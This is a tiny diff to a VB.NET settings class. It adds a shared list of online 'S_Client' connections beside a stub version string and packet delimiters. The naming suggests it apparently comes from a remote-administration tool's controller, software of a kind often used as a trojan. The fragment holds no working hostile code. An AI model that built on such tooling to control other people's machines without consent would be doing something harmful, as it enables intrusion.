@@ -6,5 +6,5 @@
     Public Shared StubVer As String = "v0.1.9.1"
     Public Shared SPL As String = "|'L'|"
     Public Shared EOF As String = "|'N'|"
-
+    Public Shared Online As New List(Of S_Client)
 End Class
